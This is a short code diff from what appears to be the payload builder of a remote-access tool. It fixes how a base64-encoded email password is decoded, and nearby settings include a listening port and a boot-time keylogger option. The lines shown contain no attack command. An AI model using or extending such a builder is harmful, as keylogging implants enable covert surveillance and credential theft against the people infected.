@@ -27,7 +27,8 @@ def assemble_stitch():
     LPORT = stini.get_value("LPORT")
 
     EMAIL = stini.get_value("EMAIL")
-    EMAIL_PWD = base64.b64decode(stini.get_value("EMAIL_PWD"))
+    email_pwd_encoded = stini.get_value("EMAIL_PWD")
+    EMAIL_PWD = base64.b64decode(email_pwd_encoded).decode('utf-8') if email_pwd_encoded else ""
     KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
 
     main_code = ''
